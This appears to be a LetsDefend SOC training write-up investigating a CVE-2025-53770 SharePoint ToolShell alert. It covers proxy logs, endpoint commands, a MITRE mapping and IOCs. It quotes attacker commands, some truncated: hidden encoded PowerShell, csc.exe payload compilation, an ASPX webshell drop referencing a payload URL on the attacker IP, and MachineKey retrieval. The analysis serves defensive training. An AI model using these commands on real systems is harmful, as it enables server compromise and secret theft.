# SOC342 - SharePoint ToolShell Auth Bypass and RCE Investigation (CVE-2025-53770)

## Incident Summary

This investigation focused on a critical web attack alert related to CVE-2025-53770, a SharePoint ToolShell vulnerability associated with authentication bypass and remote code execution (RCE). The alert was triggered by a suspicious unauthenticated POST request sent from an external IP address to a SharePoint server, targeting the ToolPane.aspx endpoint with a large request body and a suspicious referer.

During the investigation, additional endpoint telemetry revealed post-exploitation activity on the SharePoint server, including encoded PowerShell execution, malicious ASPX file creation inside SharePoint directories, compilation of a payload using csc.exe, and PowerShell access to ASP.NET application configuration secrets. Based on the combined web and host evidence, the incident was classified as a True Positive, with strong indicators of successful exploitation and attacker-controlled code execution on the target server.


| Field                    | Value                                                                                                                                                 |
| ------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Event ID**             | 320                                                                                                                                                   |
| **Alert Name**           | SOC342 - CVE-2025-53770 SharePoint ToolShell Auth Bypass and RCE                                                                                      |
| **Severity**             | Critical                                                                                                                                              |
| **Category**             | Web Attack                                                                                                                                            |
| **Detection Time**       | Jul 22, 2025, 01:07 PM                                                                                                                                |
| **Hostname**             | SharePoint01                                                                                                                                          |
| **Source IP**            | `107.191.58.76`                                                                                                                                       |
| **Destination IP**       | `172.16.20.17`                                                                                                                                        |
| **HTTP Method**          | POST                                                                                                                                                  |
| **Requested URL**        | `/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx`                                                                                        |
| **User-Agent**           | `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0`                                                                    |
| **Referer**              | `/_layouts/SignOut.aspx`                                                                                                                              |
| **Content-Length**       | `7699`                                                                                                                                                |
| **Device Action**        | Allowed                                                                                                                                               |
| **Alert Trigger Reason** | Suspicious unauthenticated POST request targeting ToolPane.aspx with large payload size and spoofed referer indicative of CVE-2025-53770 exploitation |


![Test Image](../Evidence/Alert_Tool_Shell_RCE.png)

## Investigation Objectives
- Validate whether the HTTP request was consistent with CVE-2025-53770 / ToolShell exploitation
- Determine whether the activity was limited to exploit traffic or progressed to host-level execution
- Identify evidence of payload staging, malicious file creation, or post-exploitation
- Assess whether the attack should be escalated as a successful compromise attempt

## Investigation Process

### 1) Proxy / Web Traffic Analysis

The first step was to review the proxy log tied to the alert source IP 107.191.58.76. Only one log entry from this specific IP was present, but it contained several meaningful indicators.

![Test Image](../Evidence/Log_01_RCE.png)

![Test Image](../Evidence/Log_02_RCE.png)

**Observed HTTP Request:**

- POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx HTTP/1.1
- Host: 107.191.58.76
- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
- Content-Length: 7699
- Content-Type: application/x-www-form-urlencoded
- Referer: /_layouts/SignOut.aspx

**Why this traffic was suspicious?**

- External IP → internal SharePoint server over HTTPS
- The request originated from the internet and targeted an internal SharePoint host over port 443.
- POST request to ToolPane.aspx
- The request targeted a SharePoint endpoint directly referenced by the alert and associated with ToolShell exploitation activity.
- Large request body (Content-Length: 7699)
- This was not a simple page request. It included a sizable POST body, consistent with a crafted exploit payload rather than normal browsing.
- Content-Type: application/x-www-form-urlencoded
- Indicates the request body contained form-encoded parameters, which aligns with exploitation of a web application endpoint rather than passive browsing.
- Suspicious referer: /_layouts/SignOut.aspx
-  The referer was unusual in the context of the targeted SharePoint endpoint and matched the alert’s mention of a spoofed referer, increasing confidence that the - -request was malicious.

**Analyst assessment**

At this stage, the traffic was already strongly consistent with an exploit attempt against SharePoint rather than legitimate user activity. However, proxy data alone was not enough to confirm whether exploitation succeeded, so the next step was to pivot to endpoint telemetry from the target SharePoint server.


### 2) Endpoint Investigation

Terminal history from SharePoint01 revealed multiple suspicious command executions after the malicious web request. These commands significantly changed the assessment of the incident, because they strongly indicated successful exploitation and post-exploitation activity on the host.

#### Suspicious Command #1 – Encoded PowerShell Execution

![C2_01](../Evidence/Command_Line01.png)

"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -w hidden -e <base64 payload>

Why this is suspicious

This command is a classic malicious PowerShell execution pattern:

- nop --> runs PowerShell without loading the user profile
- w hidden --> hides the PowerShell window from the user
- e --> executes a Base64-encoded payload

This combination is commonly used in malware, loaders, and post-exploitation activity because it allows attackers to hide their script logic and reduce visibility.

**Analyst assessment**

This was a strong indicator of attacker-controlled code execution on the SharePoint server and one of the clearest signs that the incident had moved beyond simple web probing.

#### Suspicious Command #2 – Compiling a Payload with csc.exe

![Test Image](../Evidence/Command_Line_02.png)

"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /out:C:\Windows\Temp\payload.exe C:\Windows\Temp\payload.cs

**Why this is suspicious?**

This command uses csc.exe, the legitimate .NET C# compiler, to compile a source file:

- Input: C:\Windows\Temp\payload.cs
- Output: C:\Windows\Temp\payload.exe

This means that source code was present on the server and was compiled into an executable directly on the host.

**Analyst assessment**

This is highly suspicious in the context of a SharePoint exploitation alert. It strongly suggests the attacker either:

- dropped malicious source code onto the host and compiled it locally, or
- leveraged server-side code execution to build a payload in-memory/on-disk as part of post-exploitation.

This was one of the strongest indicators that the attack likely succeeded.

#### Suspicious Command #3 – ASPX File Creation in SharePoint Directory

![Test Image](../Evidence/Command_Line_03.png)

"C:\Windows\system32\cmd.exe" /c echo <form runat=\"server\"> ... > C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\spinstall0.aspx

The command created an ASPX file in a SharePoint directory and included a reference to: http://107.191.58.76/payload.exe

**Why this is suspicious?**

This command is extremely important because it indicates that the attacker:

- used cmd.exe to write a file into a SharePoint web-accessible path
- created spinstall0.aspx inside the SharePoint LAYOUTS directory
- referenced an external attacker-controlled payload hosted on the same IP seen in the original alert

**Analyst assessment**

This behavior is highly consistent with malicious ASPX file creation / staging activity in a compromised SharePoint environment. It strongly suggests:

- server-side code execution
- creation of an artifact that could be used for payload delivery or webshell-like behavior
- direct linkage between the initial exploit source IP and host-level malicious activity

This was the most critical host artifact identified during the investigation.

#### Command #4 – Access to ASP.NET Machine Key Configuration

![Test Image](../Evidence/Command_Line_04.png)

"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "[System.Web.Configuration.MachineKeySection]::GetApplicationConfig()"

**Why this is suspicious?**

This PowerShell command attempts to retrieve the ASP.NET Machine Key configuration of the application. In a SharePoint / ASP.NET environment, machine key material is sensitive because it may be used for:

- application security configuration
- validation / signing of web application data
- understanding or abusing app-level trust mechanisms

**Analyst assessment**

Although this command could theoretically appear in administrative contexts, in this incident it occurred alongside:

- encoded PowerShell
- payload compilation
- malicious ASPX creation
- a suspicious SharePoint exploit request

Because of that surrounding context, I assessed it as malicious post-exploitation activity rather than legitimate administration.

### Evidence Summary

**Why this incident was classified as a True Positive**

The decision to classify this incident as a True Positive was based on the correlation of network and host evidence, not just on the original alert.

**Key reasons:**

- Malicious web request consistent with CVE-2025-53770 exploitation
- Unauthenticated POST request to a suspicious SharePoint endpoint
- Large request body
- Suspicious referer
- External source targeting internal SharePoint server
- Host-level execution after the suspicious request
- Encoded PowerShell with hidden execution
- Use of cmd.exe and csc.exe to create and compile payloads
- Creation of an ASPX file in a SharePoint directory
- Access to sensitive ASP.NET application configuration
- Strong signs of post-exploitation
- Payload staging from the attacker IP
- Malicious file creation in the SharePoint web path
- Local compilation of a suspicious executable

### Final Verdict

| Question                           | Answer                                                                   |
| ---------------------------------- | ------------------------------------------------------------------------ |
| **Was the alert a True Positive?** | **Yes**                                                                  |
| **Was the attack successful?**     | **Yes – strong evidence of successful exploitation / post-exploitation** |
| **Traffic Direction**              | **Internet → Company Network**                                           |                                                     
| **Escalation Required**            | **Yes**                                                                  |

### Attack Chain Summary

- High-level attack flow
- External attacker sent a crafted POST request to a vulnerable SharePoint endpoint.
- SharePoint server processed the request and shortly after executed suspicious PowerShell.
- The host created a malicious ASPX file inside the SharePoint LAYOUTS directory.
- The attacker staged or referenced payload.exe from the same source IP observed in the exploit request.
-The server compiled payload.cs into payload.exe using the native .NET compiler.
- PowerShell was used to query MachineKeySection application configuration, indicating deeper post-exploitation activity.

## **MITRE ATT&CK**

| Tactic                                                         | Technique                                                      | ID                                 | Why it applies                                                                                                                              |
| -------------------------------------------------------------- | -------------------------------------------------------------- | ---------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| Initial Access                                                 | Exploit Public-Facing Application                              | T1190                              | The incident began with a suspicious external POST request targeting a SharePoint web endpoint associated with CVE-2025-53770 exploitation. |
| Execution                                                      | Command and Scripting Interpreter: PowerShell                  | T1059.001                          | Encoded PowerShell was executed with hidden window and no profile, strongly indicating malicious script execution.                          |
| Execution                                                      | Command and Scripting Interpreter: Windows Command Shell       | T1059.003                          | `cmd.exe` was used to write a malicious ASPX file into a SharePoint directory.                                                              |
| Defense Evasion / Execution                                    | Signed Binary Proxy Execution / Native Utility Abuse           | T1218 / related LOLBin behavior    | Legitimate binaries such as `powershell.exe`, `cmd.exe`, and `csc.exe` were abused to execute attacker-controlled actions.                  |
| Persistence / Execution                                        | Server Software Component: Web Shell / Malicious Web Component | T1505.003                          | Creation of `spinstall0.aspx` inside a SharePoint web path strongly suggests malicious server-side web component deployment.                |
| Execution                                                      | Compile After Delivery                                         | T1500                              | `csc.exe` compiled `payload.cs` into `payload.exe` on the compromised server.                                                               |
| Credential Access / Discovery / Collection (context-dependent) | Access to application secrets / configuration                  | N/A (best-fit contextual behavior) | PowerShell was used to query `MachineKeySection`, indicating access to sensitive ASP.NET configuration.                                     |


## Indicators of Compromise

| Type        | Indicator                                                      | Notes                                                                                                                          |
| ----------- | -------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| IP Address  | `107.191.58.76`                                                | External source of the suspicious SharePoint exploit request; also referenced as the payload host in the ASPX creation command |
| Host        | `SharePoint01`                                                 | Targeted internal SharePoint server                                                                                            |
| Internal IP | `172.16.20.17`                                                 | Destination IP of the exploitation request                                                                                     |
| URL Path    | `/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx` | SharePoint endpoint targeted by the suspicious POST request                                                                    |
| Referer     | `/_layouts/SignOut.aspx`                                       | Suspicious referer associated with the exploit traffic                                                                         |
| File        | `spinstall0.aspx`                                              | ASPX file created in SharePoint directory during post-exploitation                                                             |
| File        | `C:\Windows\Temp\payload.cs`                                   | Source code file compiled on the host                                                                                          |
| File        | `C:\Windows\Temp\payload.exe`                                  | Compiled executable generated via `csc.exe`                                                                                    |
| URL         | `http://107.191.58.76/payload.exe`                             | Payload location referenced during ASPX creation                                                                               |
## Timeline of Investigation

| Time                                     | Event                                                                                                                                                     |
| ---------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Jul 22, 2025 01:07 PM**                | Critical alert triggered for **CVE-2025-53770 SharePoint ToolShell Auth Bypass and RCE**                                                                  |
| **Jul 22, 2025 01:07 PM**                | Proxy log showed external IP `107.191.58.76` sending a **POST** request to `/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx` on SharePoint01 |
| **Shortly after / during investigation** | Review of HTTP metadata showed **large POST body** (`Content-Length: 7699`), **form-encoded content**, and suspicious referer `/_layouts/SignOut.aspx`    |
| **Endpoint review**                      | Terminal history revealed **encoded hidden PowerShell execution**                                                                                         |
| **Endpoint review**                      | Terminal history revealed `csc.exe` compiling `payload.cs` into `payload.exe`                                                                             |
| **Endpoint review**                      | Terminal history revealed `cmd.exe` creating `spinstall0.aspx` inside SharePoint `LAYOUTS` path                                                           |
| **Endpoint review**                      | Terminal history revealed PowerShell access to **MachineKeySection** application configuration                                                            |
| **Final assessment**                     | Incident classified as **True Positive** with strong evidence of **successful exploitation and post-exploitation activity**                               |

## Impact Assessment

Based on the available evidence, this incident represented a high-risk compromise of a public-facing SharePoint server. The most significant risks identified were:

- Remote code execution on SharePoint01
- Malicious file creation inside SharePoint directories
- Potential deployment of a web-accessible malicious component
- Payload staging / delivery from attacker infrastructure
- Access to sensitive ASP.NET application configuration
- Possible persistence or follow-on attacker activity

Although the telemetry available in LetsDefend did not expose every artifact in full detail, the combined evidence strongly suggested that the attacker moved beyond the initial exploit attempt and achieved meaningful execution on the host.

## Conclusion

This investigation began as a critical SharePoint exploitation alert and ended with strong evidence that the attack progressed beyond simple probing. The suspicious POST request to ToolPane.aspx was consistent with CVE-2025-53770 / ToolShell exploitation, and the endpoint evidence showed multiple post-exploitation actions on the target server, including hidden PowerShell execution, ASPX file creation, payload compilation, and access to sensitive application configuration.

Based on the full set of findings, I concluded that this was a True Positive incident with high confidence of successful exploitation and escalated it for incident response.

